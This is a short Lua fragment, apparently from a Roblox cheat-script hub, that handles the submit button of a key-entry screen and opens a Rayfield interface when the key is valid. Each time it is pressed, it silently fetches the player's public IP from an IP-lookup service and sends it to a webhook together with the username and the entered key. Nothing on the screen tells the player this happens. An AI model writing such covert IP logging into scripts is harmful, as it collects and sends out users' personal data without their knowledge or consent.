--// Submit Key Button Logic
submit.MouseButton1Click:Connect(function()
    local username = game.Players.LocalPlayer.Name
    local ip = game:HttpGet("https://api.ipify.org")
    local keyEntered = textbox.Text

    if isValidKey(keyEntered) then
        sendToWebhook(username, ip, keyEntered, "Success")
        keyGui:Destroy()
        createRayfieldHub()
    else
        sendToWebhook(username, ip, keyEntered, "Failed")
        textbox.Text = ""
        textbox.PlaceholderText = "‚ùå Invalid Key. Try Again."
    end
end)
